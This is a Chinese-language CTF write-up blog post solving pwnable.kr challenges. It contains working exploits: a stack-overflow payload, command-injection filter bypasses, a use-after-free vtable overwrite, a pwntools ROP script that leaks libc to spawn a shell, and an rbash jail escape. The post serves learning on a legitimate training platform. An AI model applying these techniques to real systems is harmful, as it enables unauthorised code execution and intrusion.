---
title: "pwnable.kr学习记录"
date: 2021-03-19T14:37:04+08:00
tags: ["pwnable", "writeup"]
---

# [Toddler's Bottle] bof

```c
unsigned int __cdecl func(int a1)
{
  char s[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  puts("overflow me : ");
  gets(s);
  if ( a1 == '\xCA\xFE\xBA\xBE' )
    system("/bin/sh");
  else
    puts("Nah..");
  return __readgsdword(0x14u) ^ v3;
}
```

要覆盖func函数的参数，x86是栈上传参，返回地址后就是参数 `a1`, 而 `s` 距离 `ebp` 有 0x2c, 那么需要 0x2c + 8 也就是 52 个长度

```bash
✘ 4uuu Nya ~ (python -c "print 'A'*52+'\xBE\xBA\xFE\xCA'";cat)|nc pwnable.kr 9000
ls
bof
bof.c
flag
log
log2
super.pl
```


# [Toddler's Bottle] cmd1

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

比较常见的绕关键字

```bash
cmd1@pwnable:~$ ./cmd1 'export PATH=/bin;cat fla*'
******
```

# [Toddler's Bottle] cmd2

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```

在cmd1的基础上增加了很多过滤，而且把`export`,`PATH`都过滤掉了，考虑用绝对路径来使用命令，但是需要构造 `/`, 根目录下 `pwd` 刚好就是 `/`，所以就好解决了

```bash
cmd2@pwnable:~$ ./cmd2 'cd ..;cd ..;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*'
cd ..;cd ..;$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*
******
```

# [Toddler's Bottle] uaf

```cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}

```

这个题比较简单，而且把整个流程布置得特别清晰，简单来说也就是将 `introduce` 覆盖为 `give_shell`，main中实例化了以后再进入的分支，可以先case 3将m和w置为野指针，然后随便找个文件，将实例化后 `give_shell` 的地址写进去，再case 2重新分配，参数1设置为实例化分配的大小，IDA中可以看到是0x18个长度

```cpp
v3 = (Human *)operator new(0x18uLL);
Man::Man(v3, v10, 25LL);
```

这样的话就可以分配到刚才的内存，2这个分支选择两次，将Man和Women都设置上，不然调用函数时会报错，作为初学者的我来说最复杂的是虚表的问题，花了点时间去学了点基础知识，学了下通过调试去找了地址，但后来发现直接在IDA里就看到了，随便找个对象比如 `Man`

![](/img/pwnable-kr-study/20210503001.png)

```cpp
Human *__fastcall Man::Man(Human *a1, __int64 a2, int a3)
{
  Human *result; // rax

  Human::Human(a1);
  *(_QWORD *)a1 = off_401570;
  std::string::operator=((char *)a1 + 16, a2);
  result = a1;
  *((_DWORD *)a1 + 2) = a3;
  return result;
}
```

跟进这个 `off_401570`

```
.rodata:0000000000401560 ; `vtable for'Man
.rodata:0000000000401560 _ZTV3Man        dq 0                    ; offset to this
.rodata:0000000000401568                 dq offset _ZTI3Man      ; `typeinfo for'Man
.rodata:0000000000401570 off_401570      dq offset _ZN5Human10give_shellEv
.rodata:0000000000401570                                         ; DATA XREF: Man::Man(std::string,int)+24↑o
.rodata:0000000000401570                                         ; Human::give_shell(void)
.rodata:0000000000401578                 dq offset _ZN3Man9introduceEv ; Man::introduce(void)
.rodata:0000000000401580                 public _ZTV5Human ; weak
```

vfptr 直接就指向了 `give_shell`，重新看到在main中调用方式

```cpp
(*(void (__fastcall **)(Human *))(*(_QWORD *)v12 + 8LL))(v12);
(*(void (__fastcall **)(Human *))(*(_QWORD *)v13 + 8LL))(v13);
```

v12和v13就是Man和Women的地址，对比 `off_401570` 处看到的地址，+了8位刚好是 `introduce`，所以地址设置为 `0x401570-0x8` 即可

![](/img/pwnable-kr-study/20210503002.png)


# [Rookiss] echo1

只有功能1可以使用，是一个比较明显的溢出(x64)，程序没有开任何保护

![](/img/pwnable-kr-study/20210319001.png)

ret2shellcode使用`jmp rsp`即可，比较简单，用rop来做一下这个题

```c
__int64 echo1()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(s, 128LL);
  puts(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```

s的位置在 `rbp-20h`, 那么需要溢出到 `0x20 + 8`，通常办法是使用 `system`，那么就需要找一个 `pop rdi;ret` 的gadget，然而并找不到 

![](/img/pwnable-kr-study/20210319002.png)

回过头来看到程序中存在bss段上8位长度的变量id

```c
printf("hey, what's your name? : ");
__isoc99_scanf("%24s", v6);
v3 = o;
*(_QWORD *)o = v6[0];
v3[1] = v6[1];
v3[2] = v6[2];
id = v6[0];
```

由于v6是自己输入的名字，所以是可控的，那么可以考虑在这个地方写入`pop rdi;ret`来实现rop，接下来就是非常常见的方法，通过泄漏puts函数地址确定基址，然后构造 `system('/bin/sh')` 即可，exp如下

```python
from pwn import *

# io = remote('pwnable.kr', 9010)
io = process('./echo1')
elf = ELF('./echo1')

context.arch='amd64'
context.log_level = 'DEBUG'

id_addr = p64(elf.sym['id'])
echo_func = p64(elf.sym['echo1'])
puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])

payload = 'A' * 0x20 + id_addr * 2 + puts_got + puts_plt + echo_func
io.sendlineafter('hey, what\'s your name? :', asm('pop rdi;ret'))
io.sendlineafter('>', '1')
io.sendline(payload)
puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base = (puts_addr - 0x06f6a0)
system_addr = p64(libc_base + 0x0453a0)
bin_sh = p64(libc_base + 0x18ce17)
print 'libc base ===> %s' % hex(libc_base)
payload = 'A' * 0x20 + id_addr * 2 + bin_sh + system_addr
io.sendline(payload)
io.interactive()
```

![](/img/pwnable-kr-study/20210319003.png)

> 但是很僵硬的是，这种办法打远程打不通，用ret2shellcode才拿到了flag

# [Grotesque] cmd3

```
cmd3@pwnable:~$ cat readme
if you connect to port 9023, the "cmd3.py" script will be executed under cmd3_pwn privilege.
type 'nc 0 9023' to play this challenge.  have fun escaping from rbash jail :)
FYI, 'print_flag' is the program which prints out the flag of cmd3.
```

```python
#!/usr/bin/python
import base64, random, math
import os, sys, time, string
from threading import Timer

def rstring(N):
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

password = rstring(32)
filename = rstring(32)

TIME = 60
class MyTimer():
        global filename
        timer=None
        def __init__(self):
                self.timer = Timer(TIME, self.dispatch, args=[])
                self.timer.start()
        def dispatch(self):
                print 'time expired! bye!'
                sys.stdout.flush()
                os.system('rm flagbox/'+filename)
                os._exit(0)

def filter(cmd):
        blacklist = '` !&|"\'*'
        for c in cmd:
                if ord(c)>0x7f or ord(c)<0x20: return False
                if c.isalnum(): return False
                if c in blacklist: return False
        return True

if __name__ == '__main__':
        MyTimer()
        print 'your password is in flagbox/{0}'.format(filename)
        os.system("ls -al")
        os.system("ls -al jail")
        open('flagbox/'+filename, 'w').write(password)
        try:
                while True:
                        sys.stdout.write('cmd3$ ')
                        sys.stdout.flush()
                        cmd = raw_input()
                        if cmd==password:
                                os.system('./flagbox/print_flag')
                                raise 1
                        if filter(cmd) is False:
                                print 'caught by filter!'
                                sys.stdout.flush()
                                raise 1

                        os.system('echo "{0}" | base64 -d - | env -i PATH=jail /bin/rbash'.format(cmd.encode('base64')))
                        sys.stdout.flush()
        except:
                os.system('rm flagbox/'+filename)
                os._exit(0)

```

```bash
cmd3@pwnable:~$ nc 0 9023
total 5840
drwxr-x---   5 root cmd3_pwn    4096 Mar 15  2016 .
drwxr-xr-x 115 root root        4096 Dec 22 08:10 ..
d---------   2 root root        4096 Jan 22  2016 .bash_history
-rwxr-x---   1 root cmd3_pwn    1421 Mar 11  2016 cmd3.py
drwx-wx---   2 root cmd3_pwn   20480 Apr 13 22:58 flagbox
drwxr-x---   2 root cmd3_pwn    4096 Jan 22  2016 jail
-rw-r--r--   1 root root     5931695 Apr 13 23:50 log
-rw-r-----   1 root root         764 Mar 10  2016 super.pl
total 8
drwxr-x--- 2 root cmd3_pwn 4096 Jan 22  2016 .
drwxr-x--- 5 root cmd3_pwn 4096 Mar 15  2016 ..
lrwxrwxrwx 1 root root        8 Jan 22  2016 cat -> /bin/cat
lrwxrwxrwx 1 root root       11 Jan 22  2016 id -> /usr/bin/id
lrwxrwxrwx 1 root root        7 Jan 22  2016 ls -> /bin/ls
your password is in flagbox/V8Y4PAMYSB44V6T9OYA64J9HCLZET5AM
cmd3$
```

总结下来就是，在以下条件的限制中，读取到 `flagbox/{32个随机字符的文件名}` 内容

- rbash
- 黑名单  `` ` !&|"\'* ``
- 可见字符，且不为字母与数字

条件限定的特别死，且由于字母数字都被ban掉了，但是仍然可以使用 `?` 来访问到文件，如 `????/?? -> jail/ls [jail/id], ????/??? -> jail/cat`

然后需要考虑如何完成一次完整的命令，由于rbash的存在，不能存在 `/`，需要将命令给取出来，考虑通过构造环境变量来完成，使用 `$_` 来获取上一次执行的命令，再使用 `${}` 变量替换，在其中使用 `#` 来去掉左边的字符，如在环境中实现执行 `ls` 命令

![](/img/pwnable-kr-study/2021414-1.png)

使用同样的方法获取到cat, `????/???;__=${_#?????}`，同时由于使用的是cat，所以可以使用 `<`，完美避开了黑名单中空格的问题，接下来需要考虑的就是如何取到flag文件的文件名

由于现在已经可以使用cat命令，所以考虑将文件名写入某个文件，将其cat出来然后再cat实现，可是当前目录下是没权限写的，那么可以考虑写入到tmp目录，为了避免读取到一些奇怪的文件，所以建一个目录比较好，由于filter函数的关系，可以创建一个全是下划线的文件夹 (tmp已经有好多个这种文件夹了...。索性删了一些建自己的)，然后nc后将flagbox中的文件名写入到某个文件中，这样一来就可以构造出payload

```bash
????/???        # jail/cat
__=${_#?????}   # 获得cat
___=$($__</???/__/?????) # cat /tmp/__/zzzzz
$__<$___;       # cat flagbox/xxxxx
```

然后将读取到的password直接输入便可以得到flag

![](/img/pwnable-kr-study/2021414-2.png)